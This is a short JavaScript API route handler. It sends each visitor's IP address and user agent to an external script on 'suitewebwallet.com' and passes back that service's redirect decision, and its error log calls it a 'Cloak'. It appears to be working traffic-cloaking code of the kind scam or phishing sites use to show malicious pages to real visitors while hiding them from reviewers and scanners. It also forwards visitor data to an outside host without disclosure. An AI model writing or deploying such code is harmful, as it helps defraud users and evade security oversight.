export default async function handler(req, res) {
  const headers = { 'Content-Type': 'application/x-www-form-urlencoded' };

  const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  const userAgent = req.headers['user-agent'] || '';

  const payload = new URLSearchParams();
  payload.append('server[REMOTE_ADDR]', clientIP);
  payload.append('server[HTTP_USER_AGENT]', userAgent);

  try {
    const response = await fetch('https://suitewebwallet.com/tldr99/scr.php', {
      method: 'POST',
      headers,
      body: payload.toString(),
    });

    const json = await response.json();
    res.json(json);

  } catch (e) {
    console.error('Cloak error:', e);
    res.status(500).json({ redirect: false });
  }
}
